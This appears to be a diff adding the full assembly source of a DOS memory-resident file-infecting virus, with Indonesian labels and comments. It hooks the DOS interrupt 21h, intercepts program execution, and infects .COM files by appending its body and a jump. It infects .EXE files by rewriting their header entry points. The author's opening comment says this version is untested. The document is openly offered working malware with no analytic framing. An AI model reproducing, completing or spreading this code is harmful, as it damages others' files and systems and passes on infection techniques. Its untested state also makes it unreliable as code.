@@ -1,0 +1,373 @@
+; This is the bug fix version
+; Plz forgive me, coz I made it in a hurry, so I cant test it
+	O	equ Offset
+	B	equ 1 ptr
+	W	equ 2 ptr
+
+BesarVirus	equ Buffer - Mulai
+BesarMemVirus	equ (AkhirDariSegalanya - Mulai) / 16 + 1
+
+	.286
+	.Model	Tiny
+	.Code
+	.Radix	10h
+	.StartUp
+Mulai:
+	int 3
+	mov bp, sp
+	mov bp, [bp - 6]
+	sub bp, Offset $ - 5
+
+	push es
+	push ds
+
+	push cs
+	pop ds
+
+	push es
+	mov ax, 3521
+	int 21
+	mov w [bp + Int21Awal], bx
+	mov w [bp + Int21Awal + 2], es
+	pop es
+
+	mov ax, 6CCC
+	int 21
+
+	cmp ax, 2000
+	jnz SiapkanVirus
+	cmp bx, 1000
+	jnz SiapkanVirus
+	jmp BersiapKeluar
+
+SiapkanVirus:
+	mov ax, es
+	dec ax
+	mov es, ax
+
+	sub es:w 3, BesarMemVirus
+	sub es:w 12, BesarMemVirus
+	mov es, es:w 12
+	lea si, [bp + Mulai]
+	xor di, di
+	mov cx, BesarVirus
+	rep movsb
+
+	push ds es
+	pop ds
+	mov ax, 2521
+	mov dx, o Int21Virus - 100
+	int 21
+	pop ds
+
+BersiapKeluar:
+	cmp ds:0, 20CDh
+	jnz DariFileEXE
+
+DariFileCOM:
+	pop ds es
+	lea si, [bp + Origin]
+	mov di, 100
+	push di
+	mov cx, 3
+	rep movsb
+	call FixReg
+	ret
+
+DariFileEXE:
+	pop ds es
+	mov ax, es
+	add ax, 10
+	add [cs:bp + rCS], ax
+	add [cs:bp + rSS], ax
+	cli
+	mov ss, [cs:bp + rSS]
+	sti
+	mov sp, [cs:bp + rSP]
+	call FixReg
+	db 0EA
+
+;// Original header of .EXE & 3 bytes of .COM
+rIP	dw ?
+rCS	dw ?
+rSS	dw ?
+rSP	dw ?
+
+Origin	db 90
+	int 20
+
+Int21Virus:
+	pushf
+	cmp ax, 6CCC
+	jz CekInstall
+
+	cmp ax, 4B00
+	jz TrapLoad
+	jmp PopFlag
+
+CekInstall:
+	mov ax, 2000
+	mov bx, 1000
+	popf
+	iret
+
+PopFlag:
+	popf
+
+Int21Chain:
+	db 0EA
+Int21Awal dd 0
+
+TrapLoad:
+; Flag masih ada dalam Stack
+	push ax bx cx dx si di bp ds es
+
+	mov ax, 3D02
+	int 21
+	xchg ax, bx
+	jnc BisaDiBuka
+	jmp AkhirTrapLoad
+
+BisaDiBuka:
+	push cs cs
+	pop ds es
+
+	mov cx, 20
+	call BacaFile
+	xor dx, dx
+
+	mov ax, w o Buffer + 1 - 100	; Asumsikan file .COM
+	add ax, 3
+
+	cmp w o Buffer - 100, 'MZ'	; EXE
+	jz PeriksaTipeExe
+	cmp w o Buffer - 100, 'ZM'	; EXE
+	jz PeriksaTipeExe
+	cmp w o Buffer - 100, -1	; SYS
+	jz AkhirTrapLoad
+	cmp b o Buffer - 100, 0E9	; COM
+	jz MenujuEntryPointVirus
+
+	call Infeksi
+	jmp TutupFile
+
+PeriksaTipeExe:
+	cmp w o Buffer - 100 + 18, 40	; Pastikan bukan app. win.
+	jz AkhirTrapLoad
+	cmp w o Buffer - 100 + 1A, 0	; Pastikan tanpa overlay
+	jnz AkhirTrapLoad
+	call GetEntryPoint
+
+MenujuEntryPointVirus:
+	mov cx, dx
+	mov dx, ax
+	mov al, 0
+	call PindahPointer
+
+	mov cx, 20
+	call BacaFile
+	mov si, dx
+	xor di, di
+	rep cmpsb
+	jz TutupFile
+
+	call Infeksi
+
+TutupFile:
+	mov ah, 3E
+	int 21
+
+AkhirTrapLoad:
+	pop es ds bp di si dx cx bx ax
+	jmp PopFlag
+
+; *----------------*
+; Input :
+;	BX = file handle
+; Output :
+;	terinfeksi
+
+Infeksi:
+; Langkah-langkah :
+; 1. Reset pointer file
+	xor ax, ax
+	xor cx, cx
+	cwd
+	call PindahPointer
+
+; 2. Memeriksa jenis file
+	mov ah, 3F
+	mov cx, 20
+	mov dx, o Buffer - 100
+	int 21
+
+	cmp w o Buffer - 100, 'MZ'
+	jz InfeksiEXE
+	cmp w o Buffer - 100, 'ZM'
+	jz InfeksiEXE
+
+; 3. Pindahkan byte asli
+	mov si, o Buffer - 100
+	mov di, o Origin - 100
+	movsw
+	movsb
+
+; 4. Dapatkan ukuran file & pointer ke akhir file
+	mov al, 02
+	xor cx, cx
+	xor dx, dx
+	call PindahPointer
+
+; 5. Kalkulasi jarak & buat instruksi jump
+	sub ax, 3
+	mov w o Buffer - 100 + 1, ax
+	mov b o Buffer - 100, 0E9
+
+; 6. Tulis badan virus
+	mov ah, 40
+	mov cx, BesarVirus
+	xor dx, dx
+	int 21
+
+; 7. Ke awal file & tulis instruksi jump
+	mov al, 0
+	xor dx, dx
+	xor cx, cx
+	call PindahPointer
+
+	mov ah, 40
+	mov cx, 3
+	mov dx, o Buffer - 100
+	int 21
+	ret
+
+
+InfeksiEXE:
+; 3. Dapatkan ukuran file .EXE dan pindahkan pointer ke akhir file
+	mov al, 02
+	xor cx, cx
+	xor dx, dx
+	call PindahPointer
+	push dx
+	push ax
+
+; Kurangin dulu dg besar header
+	mov cx, w o Buffer - 100 + 8
+	shl cx, 4
+	sub ax, cx
+	sbb dx, 0
+
+; 4. Lakukan perhitungan untuk CS, SS dan IP pada header
+	mov cx, 10
+	div cx
+
+; 5. Simpan nilai baru
+	mov w o Buffer - 100 + 16, ax
+	mov w o Buffer - 100 + 0E, ax
+	mov w o Buffer - 100 + 14, dx
+	mov w o Buffer - 100 + 10, 6CCC
+
+; 6. Lakukan perhitungan untuk header offset 2 & 4
+	pop ax
+	pop dx
+	add ax, BesarVirus
+	adc dx, 0
+
+	mov cx, 200
+	div cx
+	cmp dx, 0
+	jz $ + 3
+	inc ax
+
+; 7. Simpan nilai baru
+	mov w o Buffer - 100 + 2, dx
+	mov w o Buffer - 100 + 4, ax
+
+; 8. Tulis badan virus
+	mov ah, 40
+	mov cx, BesarVirus
+	xor dx, dx
+	int 21
+
+; 9. Ke awal file dan tulis header baru
+	mov al, 00
+	xor cx, cx
+	xor dx, dx
+	call PindahPointer
+
+	mov ah, 40
+	mov cx, 20
+	mov dx, o Buffer - 100
+	int 21
+	ret
+
+
+;// P R O S E D U R
+Proc	FixReg
+	xor ax, ax
+	xor bx, bx
+	xor cx, cx
+	xor dx, dx
+	xor si, si
+	xor di, di
+	xor bp, bp
+	ret
+	Endp
+
+Proc	GetEntryPoint
+; Simpen dulu header penting
+	mov ax, w o Buffer - 100 + 16
+	mov w o rCS - 100, ax
+	mov ax, w o Buffer - 100 + 14
+	mov w o rIP - 100, ax
+	mov ax, w o Buffer - 100 + 0E
+	mov w o rSS - 100, ax
+	mov ax, w o Buffer - 100 + 10
+	mov w o rSP - 100, ax
+
+	xor dx, dx
+	mov ax, w o Buffer - 100 + 8
+	test ah, 0F0
+	jz ShiftHeader
+	push ax
+	and ax, 0F000
+	shr ax, 0C
+	mov dx, ax
+	pop ax
+
+ShiftHeader:
+	shl ax, 4
+	add ax, w o Buffer - 100 + 14
+	adc dx, 0
+	mov cx, w o Buffer - 100 + 16
+	test ch, 0F0
+	jz ShiftCS
+	push cx
+	and cx, 0F000
+	shr cx, 0C
+	add dx, cx
+	pop cx
+
+ShiftCS:
+	shl cx, 4
+	add ax, cx		; Output :
+	adc dx, 0		;	DX:AX = Alamat
+	ret
+	Endp
+
+Proc	BacaFile
+	mov ah, 3F
+	mov dx, o Buffer - 100
+	int 21
+	ret
+	Endp
+
+Proc	PindahPointer
+	mov ah, 42
+	int 21
+	ret
+	Endp
+
+Buffer	db 20 dup (?)
+AkhirDariSegalanya:
+	End
